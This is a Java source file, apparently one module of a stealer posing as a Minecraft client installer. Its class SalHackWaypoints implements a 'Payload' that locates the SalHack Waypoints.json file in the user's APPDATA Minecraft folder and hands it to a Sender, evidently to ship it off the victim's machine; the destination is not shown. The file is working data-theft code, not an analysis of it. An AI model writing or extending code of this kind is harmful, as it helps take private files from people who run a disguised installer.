package konas.installer.payload.impl;

/**
 *
 * @author ThnksCJ
 */

import konas.installer.payload.Payload;
import konas.installer.payload.Sender;
import konas.installer.util.FileUtil;

import java.io.File;
import java.util.Optional;

public final class SalHackWaypoints implements Payload
{
    @Override
    public void execute() throws Exception
    {
        Optional<File> file = FileUtil.getFile(System.getenv("APPDATA") + "\\.minecraft\\SalHack\\Waypoints\\Waypoints.json");
        file.ifPresent(Sender::send);
    }
}
